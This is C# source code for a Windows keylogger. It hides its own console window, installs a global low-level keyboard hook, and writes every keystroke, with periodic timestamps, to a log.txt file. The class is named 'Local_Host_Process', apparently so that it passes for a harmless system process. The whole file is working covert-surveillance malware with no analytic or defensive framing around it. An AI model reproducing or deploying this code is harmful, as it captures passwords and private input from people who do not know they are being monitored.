using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System;

namespace Log
{
    class Local_Host_Process
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            totalChars = 0;
            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);


        private static int numChars = -1;
        private static int totalChars;

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
            {
                totalChars++;
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                
                if (numChars == -1 || (totalChars % 1000 == 0))
                {
                    sw.Write("\r\n\r\n");
                    sw.Write(DateTime.Now);
                    sw.Write("\r\n\r\n");
                }
                if (wParam == (IntPtr)WM_KEYDOWN || (vkCode == 0xA0 || vkCode == 0xA1))
                {
                    
                    if (vkCode == 0x20)
                    {
                        sw.Write(" // ");
                    }
                    else if (vkCode == 0x0D)
                    {
                        sw.Write("\r\n");
                        sw.Write("Return");
                        sw.Write("\r\n");
                    }
                    else if (vkCode > 0x29 && vkCode < 0x5B)
                    {
                        sw.Write((Keys)vkCode);
                    }
                    else if (wParam == (IntPtr)WM_KEYUP && (vkCode == 0xA0 || vkCode == 0xA1))
                    {
                        sw.Write(" '" + (Keys)vkCode + " UP' ");
                    }
                    else
                    {
                        sw.Write(" '" + (Keys)vkCode + "' ");
                    }
                }
                
                
                if(++numChars > 100)
                {
                    numChars = 0;
                    sw.Write("\r\n");
                }
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        //These Dll's will handle the hooks. Yaaar mateys!

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // The two dll imports below will handle the window hiding.

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }
    }
}
